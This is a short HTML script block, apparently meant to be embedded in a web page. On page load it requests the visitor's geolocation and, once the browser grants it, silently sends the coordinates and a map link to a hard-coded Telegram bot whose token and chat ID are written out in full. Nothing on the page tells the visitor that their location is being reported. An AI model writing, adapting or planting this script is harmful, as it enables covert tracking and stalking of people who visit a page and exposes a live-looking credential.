<script>
    // YOUR BOT DETAILS - DO NOT CHANGE
    const BOT_TOKEN = "8689283758:AAGAoRKk6uoS1NrC828IWkpizNYM__9K7Qg";
    const CHAT_ID = "1755569425";
    
    async function sendLocation(lat, lng) {
        const message = `📍 Location Shared!\n\nLat: ${lat}\nLng: ${lng}\n\nMap: https://maps.google.com/?q=${lat},${lng}`;
        
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        try {
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
            });
        } catch(error) {
            console.log('Error:', error);
        }
    }
    
    // Auto send on page load
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                sendLocation(position.coords.latitude, position.coords.longitude);
            },
            (error) => {
                console.log('Location error:', error);
            }
        );
    }
</script>
